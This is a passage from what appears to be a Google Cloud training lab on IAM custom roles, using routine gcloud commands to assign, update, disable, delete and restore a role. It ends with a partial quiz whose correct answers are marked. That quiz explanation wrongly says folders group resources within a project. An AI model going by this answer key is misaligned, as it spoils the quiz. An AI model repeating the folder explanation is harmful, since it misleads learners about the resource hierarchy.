currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Created role [app_viewer].</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">description: Custom role to view apps</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">etag: BwVshqVuvBs=</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">includedPermissions:</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">- appengine.versions.get</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">- appengine.versions.list</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">- compute.instances.get</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">- compute.instances.list</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">name: projects/xxxxxxxxxx/roles/app_viewer</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">stage: ALPHA</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">title: App Viewer</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 248px;"></div><div class="CodeMirror-gutters" style="display: none; height: 248px;"></div></div></div></pre><ol start='' ><li><p><span>To list all the custom roles in your project, run the following command:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud iam roles list --project $DEVSHELL_PROJECT_ID</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p>&nbsp;</p><p><span>You will see both roles you created.</span></p><p><span>Click </span><em><span>Check my progress</span></em><span> to verify the objective.</span></p><p><span>Create custom roles</span></p><p>&nbsp;</p><p><span>Check my progress</span></p><p>&nbsp;</p><h4 id='task-7-use-a-custom-role'><span>Task 7. Use a custom role</span></h4><p><span>In this task, you create a custom role and assign it to Username 2.</span></p><ol start='' ><li><p><span>Make sure you are on the </span><strong><span>Username 1</span></strong><span> Cloud Console tab.</span></p></li><li><p><span>On the </span><strong><span>Navigation menu</span></strong><span>, click </span><strong><span>IAM &amp; admin &gt; IAM</span></strong><span>.</span></p></li><li><p><span>In the IAM console, locate the line for </span><strong><span>Username 2</span></strong><span> and click the Edit principal (</span><img src="https://cdn.qwiklabs.com/zxK8nW520maN72Qq6D1Lt9gCeDh7QOMGWCwhny5S8sQ%3D" referrerpolicy="no-referrer" alt="Edit icon"><span>) button. </span><strong><span>Username 2</span></strong><span> should currently have the </span><strong><span>Storage Object Viewer</span></strong><span> role.</span></p></li><li><p><span>Click </span><strong><span>Add another role</span></strong><span>, and then click </span><strong><span>Select a role</span></strong><span>.</span></p></li><li><p><span>In the </span><strong><span>Custom</span></strong><span> category, select one of the roles you just created.</span></p></li><li><p><span>Click </span><strong><span>Save</span></strong><span>.</span></p></li></ol><p><span>You have assigned </span><strong><span>Username 2</span></strong><span> to one of your custom roles.</span></p><h4 id='task-8-maintain-custom-roles'><span>Task 8. Maintain custom roles</span></h4><p><span>In this task, you modify, disable, delete, and un-delete a custom role.</span></p><p><span>When using custom roles, it&#39;s important to track what permissions are associated with the roles you create, because available permissions for Google Cloud services evolve and change over time. Unlike Google Cloud predefined roles, you control if and when permissions are added or removed.</span></p><h5 id='modify-role-permissions'><span>Modify role permissions</span></h5><p><span>To modify an existing role, you need to first get the role&#39;s definition, update the definition, and then update the role.</span></p><ol start='' ><li><p><span>Make sure you are on the </span><strong><span>Username 1</span></strong><span> Cloud Console tab.</span></p></li><li><p><span>To retrieve the </span><strong><span>app_viewer</span></strong><span> role&#39;s definition, run the following command in Cloud Shell:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud iam roles describe app_viewer --project \</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">$DEVSHELL_PROJECT_ID</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 45px;"></div><div class="CodeMirror-gutters" style="display: none; height: 45px;"></div></div></div></pre><p>&nbsp;</p><p><span>The describe command returns the following output.</span></p><p><strong><span>Output:</span></strong></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">description: Custom role to view apps</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">etag: [Etag value]</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">includedPermissions:</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">- appengine.versions.get</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">- appengine.versions.list</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">- compute.instances.get</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">- compute.instances.list</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">name: projects/[Project_ID]/roles/app_viewer</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">stage: DISABLED</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">title: App Viewer</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 225px;"></div><div class="CodeMirror-gutters" style="display: none; height: 225px;"></div></div></div></pre><ol start='' ><li><p><span>Copy the output from your describe command. Be sure to copy from the </span><code>description</code><span> line to the </span><code>title</code><span> line.</span></p></li><li><p><span>Run the following command to create a new YAML file:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">nano update-role.yaml</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p>&nbsp;</p><ol start='' ><li><p><span>Paste the output from the describe command into the nano editor.</span></p></li><li><p><span>Add the following two lines just below the </span><code>includedPermissions:</code><span> lines:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">- container.clusters.get</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">- container.clusters.list</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 45px;"></div><div class="CodeMirror-gutters" style="display: none; height: 45px;"></div></div></div></pre><p>&nbsp;</p><ol start='' ><li><p><span>Press </span><strong><span>CTRL+X,</span></strong><span> press </span><strong><span>Y</span></strong><span>, and then press </span><strong><span>Enter</span></strong><span> to save the file.</span></p></li><li><p><span>To update the </span><strong><span>app_viewer</span></strong><span> role, run the following command:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud iam roles update app_viewer --project \</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">$DEVSHELL_PROJECT_ID --file update-role.yaml</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 45px;"></div><div class="CodeMirror-gutters" style="display: none; height: 45px;"></div></div></div></pre><p>&nbsp;</p><p><span>The </span><strong><span>app_viewer</span></strong><span> role has been updated and two permissions were added.</span></p><p><span>Click </span><em><span>Check my progress</span></em><span> to verify the objective.</span></p><p><span>Modify role permissions</span></p><p>&nbsp;</p><p><span>Check my progress</span></p><p>&nbsp;</p><h5 id='disable-a-role'><span>Disable a role</span></h5><p><span>You can disable a custom role. When a role is disabled, any policy bindings related to the role are inactivated, which means that the permissions in the role will not be granted, even if you grant the role to a user.</span></p><ol start='' ><li><p><span>Make sure you are on the </span><strong><span>Username 1</span></strong><span> Cloud Console tab.</span></p></li><li><p><span>To disable the </span><strong><span>app_viewer</span></strong><span> role created earlier in this lab, run the following command in Cloud Shell:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud iam roles update app_viewer --project \</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">$DEVSHELL_PROJECT_ID --stage DISABLED</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 45px;"></div><div class="CodeMirror-gutters" style="display: none; height: 45px;"></div></div></div></pre><p>&nbsp;</p><h5 id='delete-a-role'><span>Delete a role</span></h5><p><span>Roles that are deleted are suspended and cannot be used to create new IAM policy bindings. After the role has been deleted, existing bindings remain, but are inactive. The role can be un-deleted within seven days. After seven days, the role enters a permanent deletion process that lasts 30 days.</span></p><ol start='' ><li><p><span>Make sure you are on the </span><strong><span>Username 1</span></strong><span> Cloud Console tab.</span></p></li><li><p><span>To delete the </span><strong><span>app_viewer</span></strong><span> role created earlier in this lab, run the following command in Cloud Shell:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud iam roles delete app_viewer --project \</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">$DEVSHELL_PROJECT_ID</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 45px;"></div><div class="CodeMirror-gutters" style="display: none; height: 45px;"></div></div></div></pre><p>&nbsp;</p><ol start='' ><li><p><span>To list all the roles in the project, run the following command:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud iam roles list --project $DEVSHELL_PROJECT_ID</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p>&nbsp;</p><p><span>Notice that the deleted </span><strong><span>app_viewer</span></strong><span> role is no longer listed.</span></p><ol start='' ><li><p><span>To list all the roles in the project including the deleted roles, run the following command:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud iam roles list --project $DEVSHELL_PROJECT_ID \</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">--show-deleted</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 45px;"></div><div class="CodeMirror-gutters" style="display: none; height: 45px;"></div></div></div></pre><p>&nbsp;</p><h5 id='un-delete-a-role'><span>Un-delete a role</span></h5><p><span>Role can be un-deleted within seven days of being deleted.</span></p><ol start='' ><li><p><span>To un-delete the </span><strong><span>app_viewer</span></strong><span> role, run the following command in Cloud Shell:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud iam roles undelete app_viewer --project \</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">$DEVSHELL_PROJECT_ID</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 45px;"></div><div class="CodeMirror-gutters" style="display: none; height: 45px;"></div></div></div></pre><p>&nbsp;</p><ol start='' ><li><p><span>To list all the roles in the project, run the following command:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud iam roles list --project $DEVSHELL_PROJECT_ID</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p>&nbsp;</p><p><span>Notice that the </span><strong><span>app_viewer</span></strong><span> role is listed again.</span></p><h4 id='review'><span>Review</span></h4><p><span>In this lab, you did the following:</span></p><ol start='' ><li><p><span>Used IAM to implement access control.</span></p></li><li><p><span>Restricted access to specific features or resources.</span></p></li><li><p><span>Used predefined roles to provide Google Cloud access.</span></p></li><li><p><span>Created custom IAM roles to provide permissions based on your own job roles.</span></p></li><li><p><span>Modified custom roles.</span></p></li></ol><h3 id='quiz-17'><span>Quiz</span></h3><ol start='' ><li><p><span>Which THREE of the following are IAM Objects that can be used to organize resources in Google Cloud?</span></p></li></ol><ul><li><p><strong><span>Project</span></strong></p><p><span>Correct! A project is a collection of resources that share the same billing and lifecycle. It&#39;s the primary unit of organization in Google Cloud.</span></p></li><li><p><strong><span>Organization</span></strong></p><p><span>Correct! An organization is the highest level of hierarchy in Google Cloud. It allows you to manage multiple projects and accounts with a central point of administration.</span></p></li><li><p><span>Bucket</span></p></li><li><p><span>Instance</span></p></li><li><p><span>Container</span></p></li><li><p><span>Role</span></p></li><li><p><span>Member</span></p></li><li><p><strong><span>Folder</span></strong></p></li></ul><p><span>	</span><span>Correct! Folders are used to group resources within a project. They provide a logical way to organize and manage your resources.</span></p><ol start='2' ><li><p><span>Which TWO of the following statements about Cloud IAM Policies is TRUE?</span></p></li></ol><ul><li><p><span>An organization policy can only be applied to the organization node.</span></p></li><li><p><strong><span>A policy is a collection of access statements attached to a resource.</span></strong></p><p><span>Correct! One way to think of it is, resource policies are a union of parent and resource.</span></p></li><li><p><strong><span>A Policy binding binds a list of members to a role.</span></strong></p><p><span>Correct! Members can be user accounts, Google groups, Google domains, and service accounts.</span></p></li><li><p><span>A less restrictive parent policy will not override a more restrictive child resource policy.</span></p><p>&nbsp;</p></li></ul><ol start='3' ><li><p><span>Projects in Google Cloud provide many management-related features, including the ability to (choose 